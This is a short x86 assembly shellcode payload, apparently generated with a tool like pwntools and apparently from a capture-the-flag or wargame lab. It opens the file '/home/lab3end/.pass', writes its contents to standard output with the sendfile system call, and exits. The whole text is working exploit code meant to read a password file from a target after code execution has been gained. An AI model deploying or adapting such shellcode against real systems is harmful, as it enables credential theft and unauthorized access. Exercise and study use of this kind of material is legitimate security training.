    /* push '/home/lab3end/.pass\x00' */
    push 0x737361
    push 0x702e2f64
    push 0x6e653362
    push 0x616c2f65
    push 0x6d6f682f
    /* open(file='esp', oflag=0, mode='O_RDONLY') */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80
    /* sendfile(out_fd=1, in_fd='eax', offset=0, count=2147483647) */
    push 1
    pop ebx
    mov ecx, eax
    xor edx, edx
    push 0x7fffffff
    pop esi
    /* call sendfile() */
    xor eax, eax
    mov al, 0xbb
    int 0x80
    xor eax, eax
    mov al, 0x01
    int 0x80
